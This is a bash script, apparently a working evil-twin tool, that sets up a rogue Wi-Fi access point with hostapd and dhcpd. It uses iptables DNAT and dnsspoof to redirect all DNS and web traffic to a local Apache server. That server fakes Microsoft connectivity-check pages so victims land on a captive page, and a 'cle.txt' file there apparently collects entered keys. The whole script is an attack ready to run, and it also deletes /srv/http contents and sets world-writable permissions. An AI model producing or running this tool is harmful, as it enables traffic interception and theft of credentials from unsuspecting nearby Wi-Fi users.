#!/bin/bash

carte="$(cat hostapdcarte)"
ssid="$(cat ssid.txt)"
echo "${carte}"
while [ -z "${carte}" ]; do read -r ${carte}; done


echo "$ssid"
while [ -z "${ssid}" ]; do read -r ${ssid}; done


# mv dhcpd.conf dhcpdbackup.conf
rm -rf /etc/dhcpd.conf
touch /tmp/hostapd.conf
sleep 1;
cat <<-EOF > /tmp/hostapd.conf
interface=${carte}
driver=nl80211
ssid=${ssid} 
hw_mode=g
ieee80211n=1
channel=3
EOF
sleep 2;  # L'INTERFACE wlp3s0 est a changer par #{$carte} dans le fichier dhcp EN CAS DE MISE EN LIGNE.
cat <<-EOF > /etc/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 175.0.0.0 netmask 255.255.255.0 {
interface ${carte};
range 175.0.0.2 175.0.0.10;
option routers 175.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 175.0.0.1;
allow unknown-clients;
}
EOF
sleep 1;
hostapd /tmp/hostapd.conf &> /dev/null &
sleep 5;
echo "Configuring the fake AP..."
ifconfig ${carte} up
sudo sysctl net.ipv4.ip_forward=1
ifconfig ${carte} 175.0.0.1 netmask 255.255.255.0
ifconfig ${carte} mtu 1400
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
sleep 2;
route add -net 175.0.0.0 netmask 255.255.255.0 gw 175.0.0.1 &> /dev/null
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 175.0.0.1
iptables -P FORWARD ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 175.0.0.1:80
sleep 1;
echo > /var/lib/dhcp/dhcpd.leases
sleep 1;
dhcpd -d /etc/dhcpd.conf &
sleep 3;
dnsspoof -i ${carte} &
sleep 2;
page="$(cat page.txt)"
echo "${page}"
while [ -z "${page}" ]; do read -r ${page}; done
echo "Configuring apache..."
cd /srv/http/
rm -rf *
cat <<-EOF > ncsi.txt
Microsoft NCSI
EOF
sleep 1;
cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF
sleep 1;
mkdir generate_204
sleep 1;
cd /srv/http/generate_204/
cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF
sleep 1;
cd /srv/http/
mkdir msftconnecttest
sleep 1;
mkdir msftnci
sleep 1;
cd /srv/http/msftnci/
cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF
cd /srv/http/
mkdir redirect
sleep 1;
cd /srv/http/msftconnecttest/
cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF
sleep 1;
cd /srv/http/redirect/
cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF
sleep 1;
cd /srv/http/
cp -R /etc/${page}/* /srv/http/
sleep 3;
mv ${page}.php index.php
chown -R root:http /srv/http/*
sleep 1;
cd /srv/http/shout/
chown -R root:http /srv/http/shout/chat.txt
chmod 764 /srv/http/shout/chat.txt
chmod  777 *
cd /srv/http/msftconnecttest/
cp -R /etc/${page}/msftconnecttest/* /srv/http/msftconnecttest/
sleep 3;
cd /srv/http/msftconnecttest/
mv ${page}.php index.php
chown -R root:http /srv/http/*
sleep 1;
cd /srv/http/msftconnecttest/shout/
chown -R root:http /srv/http/msftconnecttest/shout/chat.txt
chmod 764 /srv/http/msftconnecttest/shout/chat.txt
chmod  777 *
cd /srv/http/msftconnecttest/
if [ -f "cle.txt" ];then
chmod 777 *
chown -R root:http /srv/http/msftconnecttest/cle.txt
chmod 764 /srv/http/msftconnecttest/cle.txt
apachectl restart
sleep 4;
cd /srv/http/
chmod 777 *
chown -R root:http /srv/http/cle.txt
chmod 764 /srv/http/cle.txt
apachectl restart
sleep 4;
echo "\e[1;32m[*] Fake AP created...\e[0m"
else
chmod 777 *
apachectl restart
sleep 4;
echo "\e[1;32m[*] Fake AP created...\e[0m"
fi